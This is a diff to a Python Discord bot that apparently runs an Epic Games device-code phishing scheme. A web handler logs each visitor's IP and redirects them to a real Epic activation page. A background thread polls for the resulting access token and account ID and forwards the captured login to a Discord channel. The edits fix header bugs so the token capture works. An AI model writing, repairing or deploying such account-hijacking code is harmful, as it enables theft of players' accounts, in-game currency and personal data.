@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Discord Bot for Epic Games Authentication with robust message delivery, custom domain, and V-Bucks checking.
-- Last Updated: 2025-11-20 03:39:15
+- Last Updated: 2025-11-20 03:45:15
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -121,11 +121,24 @@ bot.remove_command('help')
 # --- EPIC AUTHENTICATION LOGIC ---
 # ==============================================================================
 async def create_epic_auth_session():
+    """Creates a new device authentication session with Epic Games."""
     EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
     async with aiohttp.ClientSession() as sess:
-        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r: r.raise_for_status(); token_data = await r.json()
-        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers={"Authorization": f"bearer {token_data['access_token']}"}) as r: r.raise_for_status(); dev_auth = await r.json()
-    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': 5, 'expires_in': 600}
+        # Get client token
+        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r:
+            r.raise_for_status()
+            token_data = await r.json()
+        
+        # BUG FIX: Re-added the missing Content-Type header to prevent 415 error.
+        device_auth_headers = {
+            "Authorization": f"bearer {token_data['access_token']}",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers=device_auth_headers) as r:
+            r.raise_for_status()
+            dev_auth = await r.json()
+
+    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}
 
 async def get_exchange_code(access_token):
     try:
@@ -200,7 +213,7 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip, channel_
             deadline = time.time() + expires_in
             while time.time() < deadline:
                 await asyncio.sleep(interval)
-                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", data={"grant_type": "device_code", "device_code": device_code}, headers={"Authorization": f"basic {EPIC_TOKEN}"}) as r:
+                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", data={"grant_type": "device_code", "device_code": device_code}, headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}) as r:
                     if r.status != 200 or "access_token" not in (data := await r.json()): continue
                     logger.info("✅ User logged in!")
                     access_token, account_id = data['access_token'], data['account_id']
@@ -313,7 +326,7 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
                 loop = asyncio.new_event_loop()
                 epic_session = loop.run_until_complete(create_epic_auth_session())
                 loop.close()
-                # BUG FIX: Pass the TARGET_CHANNEL_ID to the monitoring thread.
+                # Pass the TARGET_CHANNEL_ID to the monitoring thread.
                 threading.Thread(target=monitor_epic_auth_sync, args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip, TARGET_CHANNEL_ID), daemon=True).start()
                 self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
             except Exception as e: logger.error(f"Auth session error: {e}"); self.send_error(500)
